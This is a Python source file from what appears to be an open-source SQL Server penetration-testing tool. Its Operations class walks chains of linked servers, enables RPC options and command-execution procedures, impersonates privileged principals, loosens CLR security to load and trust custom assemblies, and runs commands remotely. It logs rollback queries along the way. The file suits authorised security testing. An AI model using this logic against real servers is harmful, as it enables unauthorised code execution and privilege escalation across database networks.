########################################################
__author__ = ['Nimrod Levy']
__license__ = 'GPL v3'
__version__ = 'v1.2'
__email__ = ['El3ct71k@gmail.com']

########################################################
import os
import utilities
from impacket import LOG
from playbooks import Queries
from typing import Literal, Any, Union
from classes.base_sql_client import BaseSQLClient


class Operations(BaseSQLClient):
    def __init__(self, server_address, user_name, args_options):
        super().__init__(server_address, args_options)
        self.high_privileged_server_roles = ['sysadmin']
        self.high_privileged_server_principals = ['sa']
        self.high_privileged_database_roles = ['db_owner']
        self.high_privileged_database_principals = ['dbo']

        self.use_state = not args_options.no_state
        self.username = user_name
        self.server_address = server_address
        self.debug = args_options.debug
        self.state_filename = f"{server_address}_{user_name}.state"

        self.rev2self = dict()
        self.max_recursive_links = args_options.max_recursive_links
        self.auto_yes = args_options.auto_yes
        self.custom_asm_directory = os.path.join('playbooks', 'custom-asm')

    def add_to_server_state(self, chain_id: Union[str, None], key: str, value: Any) -> str:
        """
            This function is responsible to add the server items to the server state.
        """

        if not chain_id:
            chain_id = utilities.generate_link_id()
            self.state['servers_info'][chain_id] = {
                "hostname": "",
                "chain_str": "",
                "chain_tree": list(),
                "chain_tree_ids": list(),
                "db_user": "",
                "db_name": "",
                "server_user": "",
                "link_name": "",
                "instance_name": "",
                "version": "",
                "domain_name": "",
                "chain_id": chain_id,
                "server_principals": set(),
                "database_principals": set(),
                "server_roles": set(),
                "database_roles": set(),
                "trustworthy_db_list": set(),
                "adsi_providers": set()
            }

        if key not in self.state['servers_info'][chain_id].keys():
            raise Exception(f"Key {key} is not in the server state.")

        server_info = self.state['servers_info'][chain_id][key]
        if isinstance(server_info, list) or isinstance(server_info, set):
            if not isinstance(value, list):
                value = [value]
            for v in value:
                if isinstance(server_info, list):
                    self.state['servers_info'][chain_id][key].append(v)
                else:
                    self.state['servers_info'][chain_id][key].add(v)

        elif isinstance(server_info, dict):
            for k, v in value.items():
                self.state['servers_info'][chain_id][key][k] = v
        else:
            self.state['servers_info'][chain_id][key] = value
        return chain_id

    def filter_server_by_link_name(self, link_name: str) -> list:
        """
            This function is responsible to filter the server by link name.
        """
        link_information = utilities.filter_subdict_by_key(self.state['servers_info'], "link_name", link_name)
        if not link_information:
            return []
        link_information = link_information[0]
        servers = utilities.filter_subdict_by_key(self.state['servers_info'], "hostname", link_information['hostname'])
        for server in servers:
            if server['domain_name'] != link_information['domain_name']:
                continue
            yield server

    def generate_chain_str(self, chain_id: str):
        """
            This function is responsible to generates chain string by chain id.
        """
        server_info = self.state['servers_info'][chain_id]
        if not server_info['chain_tree']:
            return server_info['hostname']

        chain_str = server_info['chain_tree'][0]

        for link_name in server_info['chain_tree'][1:]:
            chain_str += f" -> {link_name}"
        return chain_str

    def get_title(self, chain_id: str):
        """
            This function is responsible to generates chain title by chain id.
        """
        server_info = self.state['servers_info'][chain_id]
        chain_str = self.generate_chain_str(chain_id)
        user_name = server_info['server_user']
        db_user = server_info['db_user']
        db_name = server_info['db_name']
        return f"{chain_str} ({user_name} {db_user}@{db_name})"

    def is_valid_chain_id(self, chain_id: str) -> bool:
        """
            This function is responsible to check if the given chain id is valid.
        """
        if chain_id not in self.state['servers_info']:
            LOG.error(f"Chain id {chain_id} is not in the chain ids list")
            return False

        chain_str = self.generate_chain_str(chain_id)
        LOG.info(f"Chosen chain: {chain_str} (ID: {chain_id})")
        return True

    def is_valid_link_server(self, link_name: str) -> bool:
        """
            This function is responsible to check if the given linked server is valid.
        """

        filtered_servers = list(self.filter_server_by_link_name(link_name))

        if not filtered_servers:
            LOG.error(f"{link_name} is not in the linked servers list")
            return False
        LOG.info(f"Chosen linked server: {link_name}")
        return True

    def is_link_in_chain(self, chain_id: str) -> bool:
        """
            This function is responsible to check if the given linked server is in the state.
        """

        current_server_info = self.state['servers_info'][chain_id]
        hosts_list = []
        for captured_chain in current_server_info['chain_tree_ids']:
            server_info = self.state['servers_info'][captured_chain]
            hosts_list.append(f"{server_info['hostname']}.{server_info['domain_name']}")

        for host in hosts_list:
            if hosts_list.count(host) > 2:
                return True
        return False

    def detect_architecture(self, chain_id: str, arch: Literal['autodetect', 'x64', 'x86']) -> Union[str, None]:
        """
            This function is responsible to detect the architecture of a remote server.
        """
        if arch != 'autodetect':
            LOG.info(f"Architecture is set to {arch}")
            return arch

        server_info = self.state['servers_info'][chain_id]
        chain_str = self.generate_chain_str(chain_id)
        LOG.info(f"Find architecture in {chain_str}")
        for x64_sig in ["<x64>", "(X64)", "(64-bit)"]:
            if x64_sig in server_info['version']:
                LOG.info("Architecture is x64")
                return "x64"
        for x86_sig in ["<x86>", "(X86)", "(32-bit)"]:
            if x86_sig in server_info['version']:
                LOG.info("Architecture is x86")
                return "x86"
        return None

    def is_privileged_user(self, chain_id: str, user_type: Literal['server', 'database']) -> bool:
        """
            This function is responsible to check if the given user is privileged.
        """

        server_info = self.state['servers_info'][chain_id]
        current_user = server_info['server_user'] if user_type == 'server' else server_info['db_user']
        high_privileged_roles = self.high_privileged_server_roles \
            if user_type == 'server' else self.high_privileged_database_roles
        high_privileged_principals = self.high_privileged_server_principals \
            if user_type == 'server' else self.high_privileged_database_principals

        user_principals = server_info['server_principals'] if user_type == 'server' \
            else server_info['database_principals']
        user_roles = server_info['server_roles'] if user_type == 'server' else server_info['database_roles']

        if current_user in high_privileged_roles:
            return True
        if utilities.is_string_in_lists(user_principals, high_privileged_principals):
            return True
        return utilities.is_string_in_lists(user_roles, high_privileged_roles)

    def retrieve_server_information(self, chain_id: Union[str, None], link_name: Union[str, None]) -> Union[str, None]:
        """
            This function is responsible to retrieve the server information.
        """
        queries = {
            "server_information": Queries.SERVER_INFORMATION,
            "trustworthy_db_list": Queries.TRUSTWORTHY_DB_LIST,
            "server_roles": Queries.GET_USER_SERVER_ROLES,
            "db_roles": Queries.GET_USER_DATABASE_ROLES,
            "server_principals": Queries.CAN_IMPERSONATE_AS_SERVER_PRINCIPAL,
            "db_principals": Queries.CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL
        }
        required_queries = ["server_information"]
        dict_results = {}
        chain_str = self.generate_chain_str(chain_id) if chain_id else self.server_address
        LOG.info(f"Retrieve server information from {chain_str}")
        for key, query in queries.items():
            results = self.build_chain(chain_id, query)

            if not results['is_success']:
                if key in required_queries:
                    LOG.error(f"Failed to retrieve {key} from {chain_str}")
                    return None
                continue
            dict_results[key] = results['results']

        db_user = dict_results['server_information'][0]['db_user']
        server_user = dict_results['server_information'][0]['server_user']
        db_name = dict_results['server_information'][0]['db_name']

        hostname = utilities.remove_instance_name(dict_results['server_information'][0]['hostname'])

        domain_name = dict_results['server_information'][0]['domain_name']
        server_version = dict_results['server_information'][0]['server_version']
        instance_name = dict_results['server_information'][0]['instance_name']

        if not link_name:
            LOG.info(f"Discovered hostname: {hostname}")
            self.state['hostname'] = hostname
            chain_id = self.add_to_server_state(chain_id, "chain_tree", hostname)
            self.add_to_server_state(chain_id, "chain_tree_ids", [chain_id])

        link_name = link_name if link_name else hostname

        for k, v in {"hostname": hostname, "link_name": link_name, "db_user": db_user,
                     "server_user": server_user, "version": server_version, "db_name": db_name,
                     "domain_name": domain_name, "instance_name": instance_name}.items():
            chain_id = self.add_to_server_state(chain_id, k, v)

        if 'trustworthy_db_list' in dict_results.keys():
            for db_name in dict_results['trustworthy_db_list']:
                chain_id = self.add_to_server_state(chain_id, "trustworthy_db_list", db_name['name'])

        if 'server_roles' in dict_results.keys():
            for server_role in dict_results['server_roles']:
                chain_id = self.add_to_server_state(chain_id, "server_roles", server_role['group'])

        if 'db_roles' in dict_results.keys():
            for db_role in dict_results['db_roles']:
                chain_id = self.add_to_server_state(chain_id, "database_roles", db_role['group'])

        if 'server_principals' in dict_results.keys():
            for server_principal in dict_results['server_principals']:
                if server_principal['username'] == server_user:
                    continue
                if server_principal['permission_name'] != 'IMPERSONATE':
                    if not self.is_privileged_user(chain_id, 'server'):
                        continue
                LOG.info(f"Discovered server principal: {server_principal['username']} on {chain_str}")
                chain_id = self.add_to_server_state(chain_id, "server_principals", server_principal['username'])

        if 'db_principals' in dict_results.keys():
            for db_principal in dict_results['db_principals']:
                if db_principal['username'] == db_user:
                    continue

                if db_principal['permission_name'] != 'IMPERSONATE':
                    if not self.is_privileged_user(chain_id, 'database'):
                        continue
                LOG.info(f"Discovered database principal: {db_principal['username']} on {chain_str}")
                chain_id = self.add_to_server_state(chain_id, "database_principals", db_principal['username'])
        chain_id = self.add_to_server_state(chain_id, "chain_str", self.generate_chain_str(chain_id))
        return chain_id

    def set_server_options(self, chain_id: str, link_name: str, feature: str, status: Literal['true', 'false']) -> None:
        """
            This function is responsible to set the server options.
        """
        chain_str = self.generate_chain_str(chain_id)
        LOG.info(f"Set {feature} to {status} on {chain_str}")
        set_server_option = self.build_chain(chain_id, utilities.format_strings(Queries.SET_SERVER_OPTION,
                                                                                link_name=link_name,
                                                                                feature=feature, status=status),
                                             method="exec_at")
        if set_server_option['is_success']:
            rev2sef_status = 'true' if status == 'false' else 'false'
            self.add_rev2self_query(chain_id, utilities.format_strings(Queries.SET_SERVER_OPTION, link_name=link_name,
                                                                       feature=feature, status=rev2sef_status),
                                    template=set_server_option['template'])

    def retrieve_links(self, chain_id: str) -> None:
        """
            This function is responsible to retrieve all the linkable servers recursively.
        """
        server_info = self.state['servers_info'][chain_id]
        chain_str = self.generate_chain_str(chain_id)

        linkable_servers_results = self.build_chain(chain_id, Queries.GET_LINKABLE_SERVERS)
        if not linkable_servers_results['is_success']:
            LOG.warning(f"Failed to retrieve linkable servers from {chain_str}")
            return

        for row in linkable_servers_results['results']:

            link_name = utilities.remove_instance_name(row['name'])

            if row['provider'].lower() == "adsdsoobject":
                self.add_to_server_state(chain_id, "adsi_providers", link_name)
                continue

            if not row['is_remote_login_enabled']:
                LOG.info(f"Remote login is disabled on {link_name}")
                self.set_server_options(chain_id, link_name, 'rpc', 'true')
            if not row['is_rpc_out_enabled']:
                LOG.info(f"RPC out is disabled on {link_name}")
                self.set_server_options(chain_id, link_name, 'rpc out', 'true')

            chain_str = f"{' -> '.join(server_info['chain_tree'])} -> {link_name}".lstrip(" -> ")
            new_chain_id = self.add_to_server_state(None, "chain_tree", server_info['chain_tree'] + [link_name])
            self.add_to_server_state(new_chain_id, "chain_tree_ids", server_info['chain_tree_ids'] + [new_chain_id])

            if not new_chain_id or not self.retrieve_server_information(new_chain_id, link_name):
                LOG.error(f"Failed to retrieve server information from {chain_str}")
                del self.state['servers_info'][new_chain_id]
                continue

            if self.is_link_in_chain(new_chain_id):
                chain_str = self.generate_chain_str(chain_id)
                LOG.info(f"Link {link_name} already in chain {chain_str}")
                del self.state['servers_info'][new_chain_id]
                continue
            if len(self.state['servers_info'][new_chain_id]['chain_tree']) > self.max_recursive_links:
                LOG.info(f"Reached max depth for chain {chain_str} (Max depth: {self.max_recursive_links})")
                continue
            self.retrieve_links(new_chain_id)

    def direct_query(self, chain_id: str, query: str, method: Literal['OpenQuery', 'exec_at'] = "OpenQuery",
                     decode_results: bool = True, print_results: bool = False) -> bool:
        """
            This function is responsible to execute a query directly.
        """
        results = self.build_chain(chain_id, query, method, decode_results, print_results)
        if not results['is_success']:
            LOG.error(f"Failed to execute query: {query}")
            return False

        if not results['results']:
            LOG.info(f"No results found for query: {query}")
            return True

        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")

        return True

    def reconfigure_procedure(self, chain_id: str, procedure: str, required_status: bool) -> bool:
        """
        This function is responsible to enable a procedure on the server.
        """
        procedure_custom_name = utilities.retrieve_procedure_custom_name(procedure)
        is_procedure_enabled = self.build_chain(chain_id,
                                                utilities.format_strings(Queries.IS_PROCEDURE_ENABLED,
                                                                         procedure=procedure_custom_name))

        if not is_procedure_enabled['is_success']:
            LOG.error(f"Cant fetch is_{procedure}_enabled status")
            return False

        if not is_procedure_enabled['is_success']:
            LOG.error(f"Cant fetch is_{procedure}_executable status")
            return False

        if is_procedure_enabled['results'] and is_procedure_enabled['results'][-1]['procedure'] != str(required_status):
            LOG.warning(
                f"{procedure} need to be changed (Resulted status: {is_procedure_enabled['results'][-1]['procedure']})")
            if not self.is_privileged_user(chain_id, 'server'):
                is_procedure_can_be_configured = self.build_chain(chain_id, Queries.IS_UPDATE_SP_CONFIGURE_ALLOWED)
                if (not is_procedure_can_be_configured['is_success']) or \
                        is_procedure_can_be_configured['results'][0]['CanChangeConfiguration'] == 'False':
                    LOG.error(f"Cant fetch sp_configure status")
                    return False

            LOG.info(f"{procedure} can be configured")
            status = 1 if required_status else 0
            rev2self_status = 0 if required_status else 1
            reconfigure_procedure_query = utilities.format_strings(Queries.RECONFIGURE_PROCEDURE,
                                                                   procedure=procedure_custom_name, status=status)
            LOG.info(f"Reconfiguring {procedure}")
            reconfigure_procedure = self.build_chain(chain_id, reconfigure_procedure_query, method="exec_at")
            if reconfigure_procedure['is_success']:
                self.add_rev2self_query(chain_id,
                                        utilities.format_strings(Queries.RECONFIGURE_PROCEDURE, procedure=procedure,
                                                                 status=rev2self_status),
                                        template=reconfigure_procedure['template'])
            else:
                LOG.warning(f"Failed to enable {procedure}")
        return True

    def execute_procedure(self, chain_id: str, procedure: str, command: str, reconfigure: bool = False) -> bool:
        """
        This function is responsible to execute a procedure on a linked server.
        """
        is_procedure_accessible = self.build_chain(chain_id, utilities.format_strings(Queries.IS_PROCEDURE_ACCESSIBLE,
                                                                                      procedure=procedure))

        if (not is_procedure_accessible['is_success']) or \
                is_procedure_accessible['results'][0]['is_accessible'] != 'True':
            LOG.error(f"{procedure} is not accessible")
            return False

        if reconfigure:
            if not self.reconfigure_procedure(chain_id, "show advanced options", required_status=True):
                return False

            if not self.reconfigure_procedure(chain_id, procedure, required_status=True):
                return False

        if procedure == 'sp_oacreate':
            procedure_query = utilities.format_strings(Queries.SP_OAMETHOD, command=command)
        else:
            procedure_query = utilities.format_strings(Queries.PROCEDURE_EXECUTION, procedure=procedure,
                                                       command=command)

        execute_procedure_res = self.build_chain(chain_id, procedure_query, method="exec_at")
        chain_str = self.generate_chain_str(chain_id)
        if not execute_procedure_res['is_success']:
            LOG.warning(f"Failed to execute {procedure} on {chain_str}")
            if not reconfigure:
                return self.execute_procedure(chain_id, procedure, command, reconfigure=True)
            return False

        LOG.info(f"The {procedure} command executed successfully on {chain_str}")
        if not execute_procedure_res['results']:
            LOG.warning("Failed to resolve the results")
            return True

        for result in execute_procedure_res['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def add_new_custom_asm(self, chain_id: str, asm_file_location: str, asm_name: str) -> bool:
        """
        This function is responsible to add a new custom assembly to the server.
        """
        if not os.path.exists(asm_file_location):
            LOG.error(f"Cannot find {asm_file_location}")
            return False
        is_asm_exists = self.build_chain(chain_id, utilities.format_strings(Queries.IS_ASSEMBLY_EXISTS,
                                                                            asm_name=asm_name))
        if is_asm_exists['is_success'] and is_asm_exists['results'][0]['status'] == 'True':
            LOG.info(f"{asm_name} assembly is already exists")
            return True

        custom_asm_hex = utilities.hexlify_file(asm_file_location)
        if not self.reconfigure_procedure(chain_id, 'show advanced options', required_status=True):
            LOG.error("Failed to enable show advanced options")
            return False

        if not self.reconfigure_procedure(chain_id, 'clr enabled', required_status=True):
            LOG.error("Failed to enable clr")
            return False

        if not self.reconfigure_procedure(chain_id, 'clr strict security', required_status=False):
            LOG.error("Failed to disable clr strict security")
            return False

        my_hash = utilities.calculate_sha512_hash(asm_file_location)
        is_app_trusted = self.build_chain(chain_id, utilities.format_strings(Queries.IS_MY_APP_TRUSTED,
                                                                             my_hash=my_hash))

        if (not is_app_trusted['is_success']) or (is_app_trusted['results'][0]['status'] == 'False'):
            trust_asm = self.build_chain(chain_id, utilities.format_strings(Queries.TRUST_MY_APP, my_hash=my_hash),
                                         method="exec_at")
            if not trust_asm['is_success']:
                LOG.error("Failed to trust our custom assembly")
                return False

            LOG.info(f"Trusting our custom assembly")
            self.add_rev2self_query(chain_id, utilities.format_strings(Queries.UNTRUST_MY_APP, my_hash=my_hash),
                                    template=trust_asm['template'])
        add_custom_asm = self.build_chain(chain_id,
                                          utilities.format_strings(Queries.ADD_CUSTOM_ASM, custom_asm=custom_asm_hex,
                                                                   asm_name=asm_name),
                                          method="exec_at", indicates_success=['already exists in database'])
        if not add_custom_asm['is_success']:
            LOG.error(f"Failed to add custom assembly")
            return False
        self.add_rev2self_query(chain_id, utilities.format_strings(Queries.DROP_ASSEMBLY, asm_name=asm_name),
                                template=add_custom_asm['template'])
        LOG.info(f"Added custom assembly")
        return True

    def execute_custom_assembly_procedure(self, chain_id: str, asm_file_location: str, procedure_name: str,
                                          command: str, asm_name: str) -> bool:
        """
        This function is responsible to execute a custom assembly.
        In general this function is starts with creates the assembly, trust it, create the procedure and execute it.
        """

        if not self.add_new_custom_asm(chain_id, asm_file_location, asm_name):
            return False
        is_proc_exists = self.build_chain(chain_id, utilities.format_strings(Queries.IS_PROCEDURE_EXISTS,
                                                                             procedure_name=procedure_name))
        if is_proc_exists['is_success'] and is_proc_exists['results'][0]['status'] == 'True':
            LOG.info(f"{procedure_name} procedure is already exists")
        else:
            add_procedure = self.build_chain(chain_id,
                                             utilities.format_strings(Queries.CREATE_PROCEDURE, asm_name=asm_name,
                                                                      procedure_name=procedure_name, arg='command'),
                                             method="exec_at", indicates_success=['is already an object named'])

            if not add_procedure['is_success']:
                LOG.error(f"Failed to create procedure")
                return False
            self.add_rev2self_query(chain_id, utilities.format_strings(Queries.DROP_PROCEDURE,
                                                                       procedure_name=procedure_name),
                                    template=add_procedure['template'])

        procedure_query = utilities.format_strings(Queries.PROCEDURE_EXECUTION, procedure=procedure_name,
                                                   command=command)
        results = self.build_chain(chain_id, procedure_query, method="exec_at")
        if not results['is_success']:
            LOG.error(f"Failed to execute custom assembly")
            return False
        for result in results['results']:
            for key, value in result.items():
                LOG.info(f"Result: (Key: {key}) {value}")
        return True

    def execute_custom_assembly_function(self, chain_id: str, asm_file_location: str, function_name: str,
                                         class_name: str, namespace: str, command: str, asm_name: str,
                                         wait: bool = True) -> Union[None, dict]:
        """
        This function is responsible to execute a custom assembly.
        In general this function is starts with creates the assembly, trust it, create the function and execute it.
        """

        if not self.add_new_custom_asm(chain_id, asm_file_location, asm_name):
            return None
        is_func_exists = self.build_chain(chain_id, utilities.format_strings(Queries.IS_FUNCTION_EXISTS,
                                                                             function_name=function_name))
        if is_func_exists['is_success'] and is_func_exists['results'][0]['status'] == 'True':
            LOG.info(f"{function_name} function is already exists")
        else:
            add_function = self.build_chain(chain_id,
                                            utilities.format_strings(Queries.CREATE_FUNCTION,
                                                                     function_name=function_name, asm_name=asm_name,
                                                                     namespace=namespace, class_name=class_name,
                                                                     arg="@port int"),
                                            method="exec_at", indicates_success=['already an object named'])

            if not add_function['is_success']:
                LOG.error(f"Failed to create procedure")
                return None
            self.add_rev2self_query(chain_id, utilities.format_strings(Queries.DROP_FUNCTION,
                                                                       function_name=function_name),
                                    template=add_function['template'])
        function_query = utilities.format_strings(Queries.FUNCTION_EXECUTION, function_name=function_name,
                                                  command=command)
        function_execution = self.build_chain(chain_id, function_query, method="OpenQuery", wait=wait)
        if not function_execution['is_success']:
            LOG.error(f"Failed to execute custom assembly")
            return None
        LOG.info(f"Successfully executed custom assembly")
        return function_execution

    def impersonate_as(self, chain_id: str) -> list:
        """
        This function is responsible to impersonate as a server or database principal.
        """

        server_info = self.state['servers_info'][chain_id]
        for principal_type in ['server', 'database']:
            for user in server_info[f'{principal_type}_principals']:
                # Log the server principal in order to avoid infinite loop
                if principal_type == 'server':
                    query = utilities.format_strings(Queries.IMPERSONATE_AS_SERVER_PRINCIPAL, username=user)
                else:
                    query = utilities.format_strings(Queries.IMPERSONATE_AS_DATABASE_PRINCIPAL, username=user)

                yield query

    def add_rev2self_query(self, chain_id: str, query: str, template: str) -> None:
        """
        This function is responsible to add a command to the rev2self queue.
        """

        if chain_id not in self.rev2self.keys():
            self.rev2self[chain_id] = []
        self.rev2self[chain_id].append(utilities.replace_strings(template, {"[PAYLOAD]": query}))
